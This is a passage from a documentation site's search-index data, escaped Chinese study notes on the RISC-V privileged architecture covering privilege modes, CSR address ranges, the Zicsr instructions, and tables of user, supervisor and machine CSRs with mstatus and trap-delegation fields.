<p>\u7279\u6743\u7ea7\u8fd8\u6709\u4e00\u90e8\u5206\u6bd4\u8f83\u91cd\u8981\u7684\u9875\u8868\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u5c31\u4e0d\u7ee7\u7eed\u63d2\u5230\u8fd9\u9875\u91cc\u9762\u4e86\uff0c\u5355\u72ec\u653e\u5728\u4e86 RISC-V \u7279\u6743\u7ea7 ISA\uff08\u9875\u8868\u76f8\u5173\uff09\u4e00\u9875\u3002</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>The RISC-V Instruction Set Manual Volume II: Privileged Architecture v.20211203</li> <li>\u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u201c\uff08\u5927\u4e8c\u79cb\u51ac\uff09\u8bfe\u7a0b</li> </ul>"},{"location":"cs/pl/riscv/privileged/#_1","title":"\u7279\u6743\u6a21\u5f0f","text":"<p>RISC-V \u6307\u4ee4\u96c6\u6709\u4e09\u79cd\u7279\u6743\u6a21\u5f0f\uff0c\u5206\u522b\u662f Machine\uff08M\uff09\u3001Supervisor\uff08S\uff09\u548c User\uff08U\uff09\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709 Hypervisor\uff08H\uff09\u6a21\u5f0f\uff0c\u4e0d\u8fc7\u8c8c\u4f3c\u4e0d\u5e38\u7528\u3002</p> \u7b49\u7ea7 \u7f16\u7801 \u540d\u79f0 \u7f29\u5199 0 00 User/Application U 1 01 Supervisor S 2 10 Hypervisor H 3 11 Machine M <ul> <li>M \u6a21\u5f0f\u662f\u5bf9\u786c\u4ef6\u64cd\u4f5c\u7684\u62bd\u8c61\uff0c\u6709\u6700\u9ad8\u7ea7\u522b\u7684\u6743\u9650\u3002</li> <li>S \u6a21\u5f0f\u4ecb\u4e8eM\u6a21\u5f0f\u548cU\u6a21\u5f0f\u4e4b\u95f4\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5bf9\u5e94\u4e8e\u5185\u6838\u6001\uff08Kernel\uff09\u3002\u5f53\u7528\u6237\u9700\u8981\u5185\u6838\u8d44\u6e90\u65f6\uff0c\u5411\u5185\u6838\u7533\u8bf7\uff0c\u5e76\u5207\u6362\u5230\u5185\u6838\u6001\u8fdb\u884c\u5904\u7406\u3002</li> <li>U \u6a21\u5f0f\u7528\u4e8e\u6267\u884c\u7528\u6237\u7a0b\u5e8f\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5bf9\u5e94\u4e8e\u7528\u6237\u6001\uff0c\u6709\u6700\u4f4e\u7ea7\u522b\u7684\u6743\u9650\u3002</li> </ul> <p>\u7b80\u5355\u5d4c\u5165\u5f0f\u7cfb\u7edf\u5e94\u8be5\u81f3\u5c11\u6709 M \u6a21\u5f0f\uff0c\u5b89\u5168\u7684\u5d4c\u5165\u5f0f\u7cfb\u7edf\u81f3\u5c11\u8981\u6709 M\u3001U \u4e24\u4e2a\u6a21\u5f0f\uff0cUnix-like \u64cd\u4f5c\u7cfb\u7edf\u81f3\u5c11\u8981\u6709 M\u3001S\u3001U \u4e09\u4e2a\u6a21\u5f0f\u3002</p> <p>\u7279\u6743\u6a21\u5f0f\u7528\u6765\u5206\u79bb\u3001\u4fdd\u62a4\u4e0d\u540c\u7684\u8fd0\u884c\u73af\u5883\u3002\u8bd5\u56fe\u5728\u4f4e\u7279\u6743\u6a21\u5f0f\u4e0b\u6267\u884c\u9ad8\u7279\u6743\u6a21\u5f0f\u7684\u6307\u4ee4\u4f1a\u5bfc\u81f4\u5f02\u5e38\u3002</p> <p>\u4e00\u4e2a hart\uff08RISC-V hardware thread\uff0c\u6307 RISC-V \u5904\u7406\u5668\u7684\u4e00\u4e2a\u6267\u884c\u5355\u5143\uff09\u4e00\u822c\u5728 U \u6a21\u5f0f\u4e0b\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\uff0c\u76f4\u5230\u9047\u5230 trap\uff08\u6bd4\u5982\u7cfb\u7edf\u8c03\u7528\u3001\u65f6\u95f4\u4e2d\u65ad\u7b49\uff09\uff0c\u8fd9\u65f6 hart \u4f1a\u5207\u6362\u5230\u66f4\u9ad8\u7279\u6743\u7ea7\u7684 trap handler\uff0c\u6267\u884c\u5b8c\u540e\u518d\u5207\u6362\u56de\u4f4e\u6743\u9650\u6a21\u5f0f\u7ee7\u7eed\u6267\u884c\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0cRISC-V \u8fd8\u89c4\u5b9a\u4e86 Debug mode\uff08D-mode\uff09\uff0c\u7528\u4e8e\u8c03\u8bd5\uff0c\u5b83\u6bd4 M \u6a21\u5f0f\u6709\u66f4\u9ad8\u7684\u6743\u9650\uff0c\u6709\u4e00\u4e9b\u53ea\u6709 D \u6a21\u5f0f\u624d\u53ef\u4ee5\u8bbf\u95ee\u7684 CSR \u5bc4\u5b58\u5668\uff0c\u4e5f\u4f1a\u4fdd\u7559\u4e00\u4e9b\u7269\u7406\u5730\u5740\u7a7a\u95f4\u3002</p>"},{"location":"cs/pl/riscv/privileged/#csrs","title":"\u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff08CSRs\uff09","text":"<p>CSR \u662f RISC-V CPU \u4e2d\u7684\u4e00\u7cfb\u5217\u7279\u6b8a\u5bc4\u5b58\u5668\uff0c\u80fd\u591f\u53cd\u6620\u548c\u63a7\u5236 CPU \u5f53\u524d\u7684\u72b6\u6001\u548c\u6267\u884c\u673a\u5236\u3002</p> <p>RISC-V \u7ed9 CSR \u5206\u914d\u4e86 12 \u4f4d\u7684\u5730\u5740\u7a7a\u95f4\uff08csr[11:0])\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u6700\u591a 4096 \u4e2a CSR\uff0c\u5176\u4e2d csr[11:10] \u8868\u793a\u5bc4\u5b58\u5668\u7684\u8bfb\u5199\u6743\u9650\uff0800/01/10 \u5747\u8868\u793a\u53ef\u8bfb\u53ef\u5199\uff0c11 \u8868\u793a\u53ea\u8bfb\uff09\uff0ccsr[9:8] \u8868\u793a\u53ef\u4ee5\u8bbf\u95ee\u8be5\u5bc4\u5b58\u5668\u7684\u6700\u4f4e\u7279\u6743\u7ea7\u3002\u76f8\u5173\u6743\u9650\u4e00\u822c\u8868\u793a\u4e3a\u4e09\u4f4d\u5b57\u6bcd\uff0c\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u8868\u793a\u6700\u4f4e\u7279\u6743\u7ea7\uff0c\u540e\u4e24\u4e2a\u5b57\u6bcd\u8868\u793a\u8bfb\u5199\u6743\u9650\uff08RW/RO\uff09\u3002</p> <p>\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684 CSR \u4f1a\u5bfc\u81f4 illegal instruction exception\uff0c\u8bbf\u95ee\u66f4\u9ad8\u7ea7\u7684 CSR\u3001\u6216\u8005\u5199\u5165\u53ea\u8bfb CSR \u4e5f\u4f1a\u5bfc\u81f4\u8be5\u5f02\u5e38\u3002\u4e00\u4e2a\u53ef\u8bfb\u53ef\u5199\u7684\u5bc4\u5b58\u5668\u4e5f\u53ef\u80fd\u4f1a\u6709\u53ea\u8bfb\u7684\u4f4d\uff0c\u4f46\u8fd9\u65f6\u5199\u5165\u53ea\u8bfb\u4f4d\u4f1a\u88ab\u5ffd\u7565\uff08\u800c\u4e0d\u4f1a\u5bfc\u81f4\u5f02\u5e38\uff09\u3002</p> <p>CSR \u8fd8\u5206\u6709\u6807\u51c6\u548c\u975e\u6807\u51c6\u4e24\u7c7b\uff08Standard/Custom\uff09\uff0c\u5176\u4e2d Custom CSR \u5728\u672a\u6765\u6807\u51c6\u4e2d\u4e5f\u4e0d\u4f1a\u88ab\u5360\u7528\u3002\u5b83\u4eec\u662f\uff1a</p> <ul> <li>0x800~0x8FF (1000 xxxx) URW\u30010xCC0~0xCFF (1100 11xx) URO</li> <li>0x5C0~0x5FF (0101 11xx) SRW\u30010x9C0~0x9FF (1001 11xx) SRW\u30010xDC0~0xDFF (1101 11xx) SRO</li> <li>0x6C0-0x6FF (0110 11xx) HRW\u30010xAC0-0xAFF (1010 11xx) HRW\u30010xEC0-0xEFF (1110 11xx) HRO</li> <li>0x7C0-0x7FF (0111 11xx) MRW\u30010xBC0-0xBFF (1011 11xx) MRW\u30010xFC0-0xFFF (1111 11xx) MRO</li> </ul> <p>\u9488\u5bf9 D \u6a21\u5f0f\u6709\u4e00\u4e9b\u4fdd\u7559\u7684 CSR\uff0c0x7A0~0x7AF \u662f M \u6a21\u5f0f\u53ef\u4ee5\u8bbf\u95ee\u7684\u8bfb\u5199 CSR\uff0c0x7B0~0x7BF \u662f\u53ea\u6709 D \u6a21\u5f0f\u53ef\u4ee5\u8bbf\u95ee\u7684\u8bfb\u5199 CSR\u3002</p>"},{"location":"cs/pl/riscv/privileged/#csr-zicsr","title":"CSR \u6307\u4ee4\uff08Zicsr \u6269\u5c55\uff09","text":"<p>Zicsr \u6269\u5c55\u4e2d\u89c4\u5b9a\u4e86\u4e00\u7cfb\u5217\u5173\u4e8e\u8bbf\u95ee CSR \u7684\u6307\u4ee4\uff0c\u4f7f\u7528\u7279\u6743\u7ea7\u7684\u8bdd\u4e00\u5b9a\u8981\u5b9e\u73b0\u8be5\u6269\u5c55\u3002</p> <p>CSR \u6307\u4ee4\u90fd\u4f7f\u7528 I \u578b\u6307\u4ee4\uff0c\u5176\u4e2d 12 \u4f4d\u7684\u7acb\u5373\u6570\u90e8\u5206\u8868\u793a CSR \u7684\u5730\u5740\uff0cfunct3 \u4f4e 2 \u4f4d\u7528\u6765\u7f16\u7801\u8bfb/\u6539/\u5199\uff08read-modify-write\uff09\u64cd\u4f5c\u3001\u9ad8 1 \u4f4d\u8868\u793a\u662f\u5426\u6765\u81ea\u7acb\u5373\u6570\uff08\u5982\u679c\u6765\u81ea\u7acb\u5373\u6570\u5219 rs1 \u90e8\u5206\u8868\u793a\u4e00\u4e2a 5 \u4f4d\u65e0\u7b26\u53f7\u7acb\u5373\u6570\uff09\uff0copcode \u90fd\u662f SYSTEM\uff081110011\uff09\u3002</p> csrrw I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 001 rd 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acsrrw rd, csr, rs1</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06\u6307\u5b9a csr \u503c\u5b58\u5165 rd\uff0c\u5c06 rs1 \u503c\u5b58\u5165 csr</li> <li>\u6ce8\u610f\uff1a\u5982\u679c rd \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u8bfb\u53d6\u539f csr\uff08\u4e5f\u4e0d\u4f1a\u9020\u6210\u4efb\u4f55\u8bfb\u7684\u526f\u4f5c\u7528\uff09</li> </ul> csrrs I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 010 rd 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acsrrs rd, csr, rs1</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8bfb\u53d6 csr \u539f\u503c\u5230 rd\uff0c\u5c06 rs1 \u503c\u4e0e csr \u8fdb\u884c\u6309\u4f4d\u6216\u8fd0\u7b97\u540e\u5b58\u5165 csr</li> <li>\u6ce8\u610f\uff1a\u5982\u679c rs1 \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d</li> </ul> csrrc I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 011 rd 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acsrrc rd, csr, rs1</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 csr \u539f\u503c\u5b58\u5165 rd\uff0c\u5c06 rs1 \u4e2d\u4e3a 1 \u7684\u4f4d\u5728 csr \u4e2d\u5bf9\u5e94\u4f4d\u7f6e 0</li> <li>\u6ce8\u610f\uff1a\u5982\u679c rs1 \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d</li> </ul> csrrwi I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 101 rd 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acsrrwi rd, csr, uimm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06\u6307\u5b9a csr \u503c\u5b58\u5165 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u5b58\u5165 csr</li> <li>\u6ce8\u610f\uff1a\u5982\u679c rd \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u8bfb\u53d6\u539f csr</li> </ul> csrrsi I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 110 rd 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acsrrs rd, csr, uimm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8bfb\u53d6 csr \u539f\u503c\u5230 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u5b58\u5165 csr</li> <li>\u6ce8\u610f\uff1a\u5982\u679c uimm \u4e3a 0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d</li> </ul> csrrci I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 111 rd 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acsrrc rd, csr, uimm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 csr \u539f\u503c\u5b58\u5165 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u4e3a 1 \u7684\u4f4d\u5728 csr \u4e2d\u5bf9\u5e94\u4f4d\u7f6e 0</li> <li>\u6ce8\u610f\uff1a\u5982\u679c uimm \u4e3a 0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d</li> </ul>"},{"location":"cs/pl/riscv/privileged/#_2","title":"\u6c47\u7f16\u4f2a\u4ee3\u7801","text":"<p>\u4e00\u4e9b\u53ea\u8bfb/\u53ea\u5199\u7684\u6c47\u7f16\u7b80\u5316\u5199\u6cd5\uff1a</p> \u4f2a\u4ee3\u7801 \u539f\u6307\u4ee4 csrr rd, csr csrrs rd, csr, x0 csrw csr, rs1 csrrw x0, csr, rs1 csrwi csr, uimm csrrwi x0, csr, uimm csrs csr, rs1 csrrs x0, csr, rs1 csrsi csr, uimm csrrsi x0, csr, uimm csrc csr, rs1 csrrc x0, csr, rs1 csrci csr, uimm csrrci x0, csr, uimm"},{"location":"cs/pl/riscv/privileged/#csr","title":"\u5df2\u5206\u914d\u7684 CSR","text":"<p>Hypervisor/Debug \u6a21\u5f0f\u7565\u8fc7\u4e86\u3002</p>"},{"location":"cs/pl/riscv/privileged/#user","title":"\u975e\u7279\u6743\u7ea7 / User \u6a21\u5f0f","text":"\u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x001 URW fflags \u6d6e\u70b9\u5f02\u5e38\u6807\u5fd7 0x002 URW frm \u6d6e\u70b9\u820d\u5165\u6a21\u5f0f 0x003 URW fcsr \u6d6e\u70b9\u63a7\u5236\u5bc4\u5b58\u5668 0xC00 URO cycle \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\uff08rdcycle \u6307\u4ee4\u8bfb\u53d6\uff09 0xC01 URO time \u8ba1\u65f6\u5668\uff08rdtime \u6307\u4ee4\u8bfb\u53d6\uff09 0xC02 URO instret \u6307\u4ee4\u8ba1\u6570\u5668\uff08rdinstret \u6307\u4ee4\u8bfb\u53d6\uff09 0xC03-0xC1F URO hpmcounter3-31 \u6027\u80fd\u8ba1\u6570\u5668 0xC80 URO cycleh \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC81 URO timeh \u8ba1\u65f6\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC82 URO instreth \u6307\u4ee4\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC83-0xC9F URO hpmcounter3h-31h \u6027\u80fd\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09"},{"location":"cs/pl/riscv/privileged/#supervisor","title":"Supervisor \u6a21\u5f0f","text":"\u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x100 SRW sstatus Supervisor \u72b6\u6001\u5bc4\u5b58\u5668 0x104 SRW sie Supervisor \u4e2d\u65ad\u4f7f\u80fd\u5bc4\u5b58\u5668 0x105 SRW stvec Supervisor \u4e2d\u65ad\u5411\u91cf\u5bc4\u5b58\u5668 0x106 SRW scounteren Supervisor \u6027\u80fd\u8ba1\u6570\u5668\u4f7f\u80fd\u5bc4\u5b58\u5668 0x10A SRW senvcfg Supervisor \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668 0x140 SRW sscratch Supervisor trap handler \u4e34\u65f6\u5bc4\u5b58\u5668 0x141 SRW sepc Supervisor exception pc \u5bc4\u5b58\u5668 0x142 SRW scause Supervisor trap \u539f\u56e0\u5bc4\u5b58\u5668 0x143 SRW stval Supervisor trap \u503c\u5bc4\u5b58\u5668 0x144 SRW sip Supervisor \u4e2d\u65ad\u6302\u8d77\u5bc4\u5b58\u5668 0x180 SRW satp Supervisor \u5730\u5740\u7ffb\u8bd1\u5bc4\u5b58\u5668 0x5A8 SRW scontext Supervisor \u6a21\u5f0f\u4e0a\u4e0b\u6587\u5bc4\u5b58\u5668"},{"location":"cs/pl/riscv/privileged/#machine","title":"Machine \u6a21\u5f0f","text":"Machine \u4fe1\u606f\u5bc4\u5b58\u5668 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0xF11 MRO mvendorid Machine \u5382\u5546 ID 0xF12 MRO marchid Machine \u67b6\u6784 ID 0xF13 MRO mimpid Machine \u5b9e\u73b0 ID 0xF14 MRO mhartid Machine hart ID 0xF15 MRO mconfigptr Machine \u914d\u7f6e\u6570\u636e\u7ed3\u6784\u4f53\u6307\u9488 Machine trap \u8bbe\u7f6e\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x300 MRW mstatus Machine \u72b6\u6001\u5bc4\u5b58\u5668 0x301 MRW misa Machine ISA \u4e0e\u6269\u5c55\u5bc4\u5b58\u5668 0x302 MRW medeleg Machine \u5f02\u5e38\u59d4\u6258\u5bc4\u5b58\u5668 0x303 MRW mideleg Machine \u4e2d\u65ad\u59d4\u6258\u5bc4\u5b58\u5668 0x304 MRW mie Machine \u4e2d\u65ad\u4f7f\u80fd\u5bc4\u5b58\u5668 0x305 MRW mtvec Machine \u4e2d\u65ad\u5411\u91cf\u5bc4\u5b58\u5668 0x306 MRW mcounteren Machine \u6027\u80fd\u8ba1\u6570\u5668\u4f7f\u80fd\u5bc4\u5b58\u5668 0x310 MRW mstatush Machine \u72b6\u6001\u5bc4\u5b58\u5668\u9644\u52a0\u90e8\u5206\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine trap \u5904\u7406\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x340 MRW mscratch Machine trap handler \u4e34\u65f6\u5bc4\u5b58\u5668 0x341 MRW mepc Machine exception pc \u5bc4\u5b58\u5668 0x342 MRW mcause Machine trap \u539f\u56e0\u5bc4\u5b58\u5668 0x343 MRW mtval Machine trap \u503c\u5bc4\u5b58\u5668 0x344 MRW mip Machine \u4e2d\u65ad\u6302\u8d77\u5bc4\u5b58\u5668 0x34A MRW mtinst Machine trap \u6307\u4ee4\u5bc4\u5b58\u5668 0x34B MRW mtval2 Machine trap \u503c\u5bc4\u5b58\u5668 Machine \u914d\u7f6e\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x30A MRW menvcfg Machine \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668 0x31A MRW menvcfgh Machine \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0x747 MRW mseccfg Machine \u5b89\u5168\u914d\u7f6e\u5bc4\u5b58\u5668 0x757 MRW mseccfgh Machine \u5b89\u5168\u914d\u7f6e\u5bc4\u5b58\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine \u5185\u5b58\u4fdd\u62a4\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x3A0-0x3AF MRW pmpcfg0-15 Machine \u7269\u7406\u5185\u5b58\u4fdd\u62a4\u914d\u7f6e\u5bc4\u5b58\u5668\uff08\u5947\u6570\u53ea\u6709 RV32 \u6709\uff09 0x3B0-0x3BF MRW pmpaddr0-15 Machine \u7269\u7406\u5185\u5b58\u4fdd\u62a4\u5730\u5740\u5bc4\u5b58\u5668 Machine \u8ba1\u6570/\u8ba1\u65f6\u5668 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0xB00 MRW mcycle Machine \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668 0xB02 MRW minstret Machine \u6307\u4ee4\u8ba1\u6570\u5668 0xB03-0xB1F MRW mhpmcounter3-31 Machine \u6027\u80fd\u8ba1\u6570\u5668 0xB80 MRW mcycleh Machine \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xB82 MRW minstreth Machine \u6307\u4ee4\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xB83-0xB9F MRW mhpmcounter3h-31h Machine \u6027\u80fd\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine \u8ba1\u6570\u5668\u8bbe\u7f6e \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x320 MRW mcounterinhibit Machine \u6027\u80fd\u8ba1\u6570\u5668\u7981\u6b62\u5bc4\u5b58\u5668 0x323-0x33F MRW mhpmevent3-31 Machine \u6027\u80fd\u8ba1\u6570\u5668\u4e8b\u4ef6\u9009\u62e9\u5bc4\u5b58\u5668"},{"location":"cs/pl/riscv/privileged/#csr_1","title":"CSR \u5b57\u6bb5\u7f29\u5199\u89c4\u8303","text":"<p>\u540e\u9762\u5728\u5b9a\u4e49\u5404\u4e2a CSR \u5b57\u6bb5\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u4e00\u4e9b\u7f29\u5199\uff1a</p> <ul> <li>WPRI\uff08reserved Writes Preserve values, Reads Ignore values\uff09\uff1a\u5199\u4fdd\u7559\uff0c\u8bfb\u5ffd\u7565</li> <li>WLRL\uff08Write/Read Only Legal values\uff09\uff1a\u53ea\u80fd\u5199/\u8bfb\u5408\u6cd5\u503c\uff08\u4e0d\u5408\u6cd5\u7684\u65f6\u5019\u63a8\u8350\u4f46\u4e0d\u5fc5\u987b\u629b\u51fa\u5f02\u5e38\uff09</li> <li>WARL\uff08Write Any values, Read Legal values\uff09\uff1a\u5199\u4efb\u610f\u503c\uff0c\u8bfb\u5408\u6cd5\u503c</li> </ul>"},{"location":"cs/pl/riscv/privileged/#machine_1","title":"Machine \u6a21\u5f0f","text":""},{"location":"cs/pl/riscv/privileged/#m-csrs","title":"M \u6a21\u5f0f CSRs","text":"<p>\u53ea\u5199\u4e00\u4e9b\u91cd\u8981\u3001\u6709\u7528\u7684\u3002</p>"},{"location":"cs/pl/riscv/privileged/#misa","title":"misa","text":"<ul> <li>[31:30] / [63:62] WARL MXL\uff1a\u7f16\u7801 XLEN\uff0c1 \u8868\u793a RV32\uff0c2 \u8868\u793a RV64\uff0c3 \u8868\u793a RV128</li> <li>[25:0] WARL Extensions\uff1a\u6269\u5c55\uff0c\u4ece 0 \u4f4d\u5230 25 \u4f4d\u4f9d\u6b21\u8868\u793a A-Z \u6269\u5c55\uff0c0 \u8868\u793a\u4e0d\u5b58\u5728\uff0c1 \u8868\u793a\u5b58\u5728</li> </ul>"},{"location":"cs/pl/riscv/privileged/#mstatus","title":"mstatus","text":"<p>\u4ec5\u4ec5\u662f\u4e00\u90e8\u5206\u4e2d\u65ad\u5904\u7406\u65f6\u4f1a\u7528\u5230\u7684\u5b57\u6bb5\uff1a</p> <ul> <li>1 SIE\uff1aS \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd</li> <li>3 MIE\uff1aM \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd</li> <li>5 SPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a S \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd</li> <li>7 MPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a M \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd</li> <li>8 WARL SPP\uff1aS \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b</li> <li>[12:11] WARL MPP\uff1aM \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b</li> <li>22 WARL TSR\uff1a\u4e3a 1 \u65f6\u7981\u6b62 S \u6a21\u5f0f\u4e0b\u6267\u884c sret\uff0c\u4e3a 0 \u65f6\u5141\u8bb8\uff0c\u6ca1\u6709 S \u6a21\u5f0f\u65f6\u4e3a\u53ea\u8bfb 0</li> </ul>"},{"location":"cs/pl/riscv/privileged/#mtvec","title":"mtvec","text":"<p>\u7528\u4e8e\u4fdd\u5b58 Machine \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740</p> <ul> <li>[31:2] / [63:2] WARL Base\uff1a\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\uff084 \u5b57\u8282\u5bf9\u9f50\uff09</li> <li>[1:0] WARL Mode\uff1a\u6a21\u5f0f\uff0c\u5206\u4e3a\u4ee5\u4e0b\u4e24\u79cd\uff1a<ul> <li>0 - Direct\uff1a\u76f4\u63a5\u6a21\u5f0f\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\u4e3a Base</li> <li>1 - Vectored\uff1a\u5411\u91cf\u6a21\u5f0f\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\u4e3a Base + 4 * cause\uff08cause \u5728\u4e0b\u9762\u6709\u5b9a\u4e49\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/riscv/privileged/#medeleg-mideleg","title":"medeleg &amp; mideleg","text":"<p>\u7edf\u79f0 machine trap delegation registers\uff0cmideleg\uff08machind interrupt delegation register\uff09\u7528\u4e8e\u4fdd\u5b58\u54ea\u4e9b\u4e2d\u65ad\u8981\u59d4\u6258\u7ed9 S \u6a21\u5f0f\u8fdb\u884c\u5904\u7406\u3002medeleg\uff08machine exception delegation register\uff09\u7528\u4e8e\u4fdd\u5b58\u54ea\u4e9b\u5f02\u5e38\u8981\u59d4\u6258\u7ed9 S \u6a21\u5f0f\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u4e2d\u65ad\u7801\uff1a</p> <ul> <li>1: Supervisor Software Interrupt</li> <li>3: Machine Software Interrupt</li> <li>5: Supervisor Timer Interrupt</li> <li>7: Machine Timer Interrupt</li> <li>9: Supervisor External Interrupt</li> <li>11: Machine External Interrupt</li> </ul> <p>\u5f02\u5e38\u7801\uff1a</p> <ul> <li>0: Instruction Address Misaligned</li> <li>1: Instruction Access Fault</li> <li>2: Illegal Instruction</li> <li>3: Breakpoint</li> <li>4: Load Address Misaligned</li> <li>5: Load Access Fault</li> <li>6: Store/AMO Address Misaligned</li> <li>7: Store/AMO Access Fault</li> <li>8: Environment Call from U-mode</li> <li>9: Environment Call from S-mode</li> <li>11: Environment Call from M-mode</li> <li>12: Instruction Page Fault</li> <li>13: Load Page Fault</li> <li>15: Store/AMO Page Fault</li> </ul> <p>\u9700\u8981\u59d4\u6258\u54ea\u4e9b\u4e2d\u65ad/\u5f02\u5e38\uff0c\u5c31\u5c06\u5bf9\u5e94\u5bc4\u5b58\u5668\u7684\u5bf9\u5e94\u4f4d\u8bbe\u7f6e\u4e3a 1\uff0c\u4e0d\u9700\u8981\u59d4\u6258\u5c31\u8bbe\u7f6e\u4e3a 0\u3002</p>"},{"location":"cs/pl/riscv/privileged/#mip-mie","title":"mip &amp; mie","text":"<p>\u5206\u522b\u662f machine interrupt pending \u548c machine interrupt 